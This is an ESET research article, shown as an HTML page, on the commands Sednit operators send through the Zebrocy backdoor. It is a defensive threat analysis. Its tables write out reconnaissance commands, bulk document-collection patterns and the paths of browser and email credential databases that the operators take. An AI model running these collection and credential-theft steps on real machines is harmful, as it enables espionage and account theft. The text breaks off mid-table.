<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'ESET Research',
        'ArticleCategory': 'Malware',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>A journey to Zebrocy land | WeLiveSecurity</title>
<meta name="description" content="ESET researchers analyze what happens after a victim machine is running a new backdoor deployed by the infamous Sednit APT group."/>
<link rel="canonical" href="https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="pt_BR" />
<meta property="og:locale:alternate" content="fr_FR" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="A journey to Zebrocy land | WeLiveSecurity" />
<meta property="og:description" content="ESET researchers analyze what happens after a victim machine is running a new backdoor deployed by the infamous Sednit APT group." />
<meta property="og:url" content="https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2019-05-22T09:30:35+00:00" />
<meta property="article:modified_time" content="2019-06-19T11:36:35+00:00" />
<meta property="og:updated_time" content="2019-06-19T11:36:35+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2019/05/shutterstock_484392712-1000.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2019/05/shutterstock_484392712-1000.jpg" />
<meta property="og:image:width" content="1000" />
<meta property="og:image:height" content="667" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="ESET researchers analyze what happens after a victim machine is running a new backdoor deployed by the infamous Sednit APT group." />
<meta name="twitter:title" content="A journey to Zebrocy land | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2019/05/shutterstock_484392712-1000.jpg" />
<meta name="twitter:creator" content="@welivesecurity" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/br/2019/05/23/zebrocy-analise-dos-comandos-usados-pelo-backdoor-do-grupo-sednit/" hreflang="pt" />
<link rel="alternate" href="https://www.welivesecurity.com/fr/2019/05/22/epopee-pays-zebrocy/" hreflang="fr" />
<link rel="alternate" href="https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2019/05/22/zebrocy-analisis-de-los-comandos-utilizados-por-el-backdoor-de-sednit/" hreflang="es" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2019/05/23/sednit-backdoor-eine-reise-ins-zebrocy-land/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single wide">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/2019/05/23/zebrocy-analise-dos-comandos-usados-pelo-backdoor-do-grupo-sednit/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2019/05/22/epopee-pays-zebrocy/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2019/05/22/zebrocy-analisis-de-los-comandos-utilizados-por-el-backdoor-de-sednit/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2019/05/23/sednit-backdoor-eine-reise-ins-zebrocy-land/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/2019/05/23/zebrocy-analise-dos-comandos-usados-pelo-backdoor-do-grupo-sednit/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2019/05/22/epopee-pays-zebrocy/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2019/05/22/zebrocy-analisis-de-los-comandos-utilizados-por-el-backdoor-de-sednit/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2019/05/23/sednit-backdoor-eine-reise-ins-zebrocy-land/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-wide" style="background-image: url('../../../../wp-content/uploads/2019/05/shutterstock_484392712-1.jpg'); background-position: 50% 50%;">
    <div class="text-wrapper">
        <div class="container promo-text">
            <div class="col-md-11 col-sm-11 col-xs-12 no-padding">
                <h1>A journey to Zebrocy land</h1>
<div class="excerpt">ESET sheds light on commands used by the favorite backdoor of the Sednit group</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2020/04/android-fullpage-1024x576-Copy-222x179.jpg" alt="ESET Research">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                    ESET Research                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2019-05-22 11:30:35">22 May 2019 - 11:30AM</time>
		</span>
			</span>
</div>
            </div>
        </div>
    </div>
</div>

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F05%2F22%2Fjourney-zebrocy-land%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F05%2F22%2Fjourney-zebrocy-land%2F&text=A journey to Zebrocy land%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2019%2F05%2F22%2Fjourney-zebrocy-land%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt wide">
                                <p>ESET sheds light on commands used by the favorite backdoor of the Sednit group</p>
                            </div>

                            <p>What happens when a victim is compromised by a backdoor and the operator is controlling it? It’s a difficult question that is not possible to answer entirely by reverse engineering the code. In this article we will analyze commands sent by the operator to their targets.</p>
<p>The Sednit group – also known as APT28, Fancy Bear, Sofacy or STRONTIUM – has been operating since at least 2004 and has made headlines frequently in past years.</p>
<p>Recently, we unveiled the existence of a UEFI rootkit, called <a href="https://www.welivesecurity.com/2018/09/27/lojax-first-uefi-rootkit-found-wild-courtesy-sednit-group/" target="_blank" rel="noopener">LoJax</a>, which we attribute to the Sednit group. This is a first for an APT group, and shows Sednit has access to very sophisticated tools to conduct its espionage operations.</p>
<p>Three years ago, the Sednit group unleashed new components targeting victims in various countries in the Middle East and Central Asia. Since then, the number and diversity of components has increased drastically. <a href="https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/" target="_blank" rel="noopener">ESET</a> <a href="https://www.welivesecurity.com/2018/11/20/sednit-whats-going-zebrocy/" target="_blank" rel="noopener">researchers</a> and colleagues from <a href="https://securelist.com/masha-and-these-bears/84311/" target="_blank" rel="noopener">other</a> <a href="https://unit42.paloaltonetworks.com/sofacy-creates-new-go-variant-of-zebrocy-tool/" target="_blank" rel="noopener">companies</a> have documented these components; however, in this article we will focus on what&#8217;s beyond the compromise, what the operators do once a victim system is running a Zebrocy Delphi backdoor.</p>
<h1>The bear’s bait</h1>
<p>At the end of August 2018, the Sednit group launched a spearphishing email campaign where it distributed shortened URLs that delivered the first stage of Zebrocy components. In the past, Sednit used a similar technique for <a href="https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf" target="_blank" rel="noopener">credential phishing</a>. However, it is unusual for the group to use this technique to deliver one of its malware components directly. Previously, it had used exploits to deliver and execute the first stage malware, while in this campaign the group relied entirely on social engineering to lure victims into running the first part of the chain. The screenshot in Figure 1 shows Bitly statistics for the shortened URL used in this campaign.</p>
<div id="attachment_125799" style="width: 1034px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/05/Figure-1-WM.png"><img class="wp-image-125799 size-large" src="/wp-content/uploads/2019/05/Figure-1-WM-1024x462.png" alt="" width="1024" height="462" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/05/Figure-1-WM-1024x462.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2019/05/Figure-1-WM-300x135.png 300w, https://www.welivesecurity.com/wp-content/uploads/2019/05/Figure-1-WM-768x346.png 768w, https://www.welivesecurity.com/wp-content/uploads/2019/05/Figure-1-WM.png 1431w" sizes="(max-width: 1024px) 100vw, 1024px" /></a><p class="wp-caption-text"><i>Figure 1. Statistics of the Bitly URL</i></p></div>
<p>About 20 clicks were recorded on this link in the same week that the URL was created, and these presumably downloaded the target archive. Let’s keep in mind that this may mean fewer than 20 potential victims, as victims may have clicked on the URL twice, or maybe even more times, because the outcome was not what they expected&#8230; as we will describe below.</p>
<p>While ESET telemetry data indicates that this URL was delivered by spearphishing emails, we don’t have a sample of such an email. The shortened URL leads the victim to an IP-address-based URL, where the archived payload is located.</p>
<p>Unfortunately, without the email message, we don&#8217;t know if there are any instructions for the user, if there is any further social engineering, or if it relies solely on the victim&#8217;s curiosity. The archive contains two files; the first is an executable file, while the second is a decoy PDF document.</p>
<div id="attachment_125800" style="width: 310px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/05/Figure-2-WM.png"><img class="wp-image-125800" src="/wp-content/uploads/2019/05/Figure-2-WM.png" alt="" width="300" height="128" /></a><p class="wp-caption-text"><i>Figure 2. Files extracted from the archive (Google Translate suggests “CATALOGUE &#8211; (2018).exe” and “Order 97.pdf” from the Ukrainian)</i></p></div>
<p>Note there is a typo in the executable&#8217;s filename; it should be “ДОВIДНИК” instead of “ДОВIДНIК”. Once the binary is executed, a password prompt dialog box opens. The result of the password validation will always be wrong, but after the apparent validation attempt, the decoy PDF document is opened. That document appears to be empty, but the downloader, which is written in Delphi, continues running in the background. The IP address is also used in the URL hardcoded into the first binary downloader.</p>
<h1>The bear’s lair</h1>
<p>The Stage-1 downloader will download and execute a new downloader, written in C++, not so different from other Zebrocy downloaders. Once again this downloader is as straightforward as the Zebrocy gang&#8217;s other downloaders. It creates an ID and it downloads a new, interesting backdoor, (this time) written in Delphi.</p>
<p>As we explained in our <a href="https://www.welivesecurity.com/2018/11/20/sednit-whats-going-zebrocy/" target="_blank" rel="noopener">most recent blogpost</a> about Zebrocy, the configuration of the backdoor is stored in in the resource section and is split into four different hex-encoded, encrypted blobs. These blobs contain the different parts of the configuration.</p>
<div id="attachment_125801" style="width: 224px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/05/Figure-3-WM.png"><img class="wp-image-125801 size-large" src="/wp-content/uploads/2019/05/Figure-3-WM-214x1024.png" alt="" width="214" height="1024" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/05/Figure-3-WM-214x1024.png 214w, https://www.welivesecurity.com/wp-content/uploads/2019/05/Figure-3-WM-63x300.png 63w" sizes="(max-width: 214px) 100vw, 214px" /></a><p class="wp-caption-text"><i>Figure 3. Overview of the resource section</i></p></div>
<p>Once the backdoor sends basic information about its newly compromised system, the operators take control of the backdoor and start to send commands right away.</p>
<p>Hence, the time between the victim running the downloader and the operators&#8217; first commands is only a few minutes.</p>
<h1>How the bear hunts</h1>
<p>In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.</p>
<p>The commands available are located in one of the configuration blobs mentioned earlier (the &#8220;commands&#8221; blob in Figure 3). The number of supported commands has increased over time, with the latest version of the backdoor having more than thirty. As we did not identify a pattern in the order which the commands are invoked, we believe the operators are executing them manually.</p>
<p>The first set of commands gathers information about the victim&#8217;s computer and environment:</p>

<table id="tablepress-682" class="tablepress tablepress-id-682">
<thead>
<tr class="row-1 odd">
	<th class="column-1"><strong>Commands</strong></th><th class="column-2"><strong>Arguments</strong></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><strong><span style="font-family: courier new, courier, monospace;">SCREENSHOT</span></strong></td><td class="column-2"><strong><span style="font-family: courier new, courier, monospace;">None</span></strong></td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><strong><span style="font-family: courier new, courier, monospace;">SYS_INFO</strong></td><td class="column-2"><strong><span style="font-family: courier new, courier, monospace;">None</span></strong></td>
</tr>
<tr class="row-4 even">
	<td class="column-1"><strong><span style="font-family: courier new, courier, monospace;">GET_NETWORK</span></strong></td><td class="column-2"><strong><span style="font-family: courier new, courier, monospace;">None</span></strong></td>
</tr>
<tr class="row-5 odd">
	<td class="column-1"><strong><span style="font-family: courier new, courier, monospace;">SCAN_ALL </span></strong></td><td class="column-2"><strong><span style="font-family: courier new, courier, monospace;">None</span></strong></td>
</tr>
</tbody>
</table>

<p>The commands above are commonly executed when the operators first connect to a newly activated backdoor. They don’t have any arguments, and they are quite self-explanatory. Other commands commonly seen executed shortly after these backdoors are activated, listed below:</p>

<table id="tablepress-683" class="tablepress tablepress-id-683">
<thead>
<tr class="row-1 odd">
	<th class="column-1"><strong>Commands</strong></th><th class="column-2"><strong>Arguments</strong></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><strong><span style="font-family: courier new, courier, monospace;">REG_GET_KEYS_VALUES</span></strong></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">HKEY_CURRENT_USER <br />
Software\Microsoft\Windows\CurrentVersion</span></td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><strong><span style="font-family: courier new, courier, monospace;">DOWNLOAD_DAY(30)</span></strong></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">c:\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg;*.jpeg;<br />
*.bmp;*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf;*.lhz;<br />
<br />
d:\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg;*.jpeg;<br />
*.bmp;*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf;*.lhz;</span></td>
</tr>
<tr class="row-4 even">
	<td class="column-1"><strong><span style="font-family: courier new, courier, monospace;">DOWNLOAD_DAY(1)</span></strong></td><td class="column-2"><span style="font-family: courier new, courier, monospace;"><br />
c:\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg*.jpeg<br />
*.bmp*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf;<br />
<br />
d:\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg*.jpeg<br />
*.bmp*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf;<br />
</span></td>
</tr>
<tr class="row-5 odd">
	<td class="column-1"><strong><span style="font-family: courier new, courier, monospace;">CMD_EXECUTE</span></strong></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">echo %APPDATA%<br />
ipconfig /all<br />
netstat -aon</span></td>
</tr>
<tr class="row-6 even">
	<td class="column-1"><strong><span style="font-family: courier new, courier, monospace;">CMD_EXECUTE</span></strong></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">wmic process get Caption,ExecutablePath<br />
reg query<br />
"HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /s</span></td>
</tr>
</tbody>
</table>

<p>Those who already have read our previous articles about Zebrocy will notice that more or less the same kind of information is sent, over and over again by previous stages. This information is requested within a few minutes of initial compromise and the amount of data the operator will have to deal with is quite considerable.</p>
<p>In order to collect even more information, from time to time the Zebrocy operators upload and use dumpers on victims&#8217; machines. The current dumpers have some similarities with those previously used by the group. In this case, <em>Yandex Browser, Chromium, 7Star Browser (</em>a <em>Chromium-</em>based browser<em>), </em>and <em>CentBrowser </em>are targeted, as well as versions of Microsoft Outlook from 1997 through 2016:</p>

<table id="tablepress-684" class="tablepress tablepress-id-684">
<thead>
<tr class="row-1 odd">
	<th class="column-1"><strong>Command</strong></th><th class="column-2"><strong>Arguments</strong></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><strong><span style="font-family: courier new, courier, monospace;">UPLOAD_AND_EXECUTE_FILE</span></strong></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">C:\ProgramData\Office\MS\msoffice.exe<br />
[…]<br />
4D5A9000…</span><br />
</td>
</tr>
</tbody>
</table>

<p>These dumpers create log files indicating the presence or absence of potential databases to dump:</p>

<table id="tablepress-685" class="tablepress tablepress-id-685">
<thead>
<tr class="row-1 odd">
	<th class="column-1"><strong>Command</strong></th><th class="column-2"><strong>Arguments</strong></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><strong><span style="font-family: courier new, courier, monospace;">DOWNLOAD_LIST</span></strong></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">C:\ProgramData\Office\MS\out.txt<br />
C:\ProgramData\Office\MS\text.txt</span></td>
</tr>
</tbody>
</table>

<p>The current dumper contains the following output when there are no databases to dump:</p>
<p><span style="font-family: courier new, courier, monospace;">%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default\Login Data not found</span><br />
<span style="font-family: courier new, courier, monospace;">%LOCALAPPDATA%\Chromium\User Data\Default\Login Data not found</span><br />
<span style="font-family: courier new, courier, monospace;">%LOCALAPPDATA%\7Star\7Star\User Data\Default\Login Data not found</span><br />
<span style="font-family: courier new, courier, monospace;">%LOCALAPPDATA%\CentBrowser\User Data\Default\Login Data not found</span></p>
<p>These dumpers are quickly removed once they have done their job. Moreover, the backdoor contains a list of filenames related to credentials from software listed below (database names):</p>

<table id="tablepress-686" class="tablepress tablepress-id-686">
<tbody class="row-hover">
<tr class="row-1 odd">
	<td class="column-1">key3.db</td><td class="column-2">Firefox private keys (now named key4.db)</td>
</tr>
<tr class="row-2 even">
	<td class="column-1">cert8.db</td><td class="column-2">Firefox certificate database</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">logins.json</td><td class="column-2">Firefox encrypted password database</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">account.cfn</td><td class="column-2">The Bat! (email client) account credentials</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">wand.dat</td><td class="column-2">Opera password database</td>
</tr>
</tbody>
</table>

<p>The operators take care of retrieving these databases if they are present on the victim’s computer.</p>

<table id="tablepress-687" class="tablepress tablepress-id-687">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Command</th><th class="column-2">Arguments</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><strong><span style="font-family: courier new, courier, monospace;"><br />
DOWNLOAD_LIST</span></strong></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">%APPDATA%\The Bat!\Account.CFN<br />
%APPDATA%\The Bat!\[REDACTED]\Account.CFN</span></td>
</tr>
</tbody>
</table>

<p>The operators retrieve these files on the machine using the DOWNLOAD_LIST command. This command can be used when the operators are aware of the presence of interesting files on the computer.</p>
<p>Finally, depending on how interesting the victim is, they malware operators may deploy another custom backdoor. This backdoor is executed using the CMD_EXECUTE command:</p>
<table border="0">
<tbody>
<tr>
<td style="width: 122.35px;"><strong>Command</strong></td>
<td style="width: 1240.65px;"><strong>Arguments</strong></td>
</tr>
<tr>
